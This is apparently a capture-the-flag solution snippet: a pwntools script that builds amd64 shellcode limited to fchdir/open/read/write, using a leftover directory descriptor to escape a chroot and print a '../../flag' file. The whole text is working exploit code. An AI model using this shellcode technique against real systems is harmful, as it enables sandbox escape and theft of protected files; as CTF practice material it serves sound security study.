only fchdir/open/read/write can used:  
```
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcraft.fchdir(3)
shellcode+=shellcraft.open("../../flag")
shellcode+=shellcraft.read(4, 0x13373e8, 0x100)
shellcode+=shellcraft.write(1, 0x13373e8, 0x100)
shellcode=asm(shellcode)
sys.stdout.buffer.write(shellcode)
```
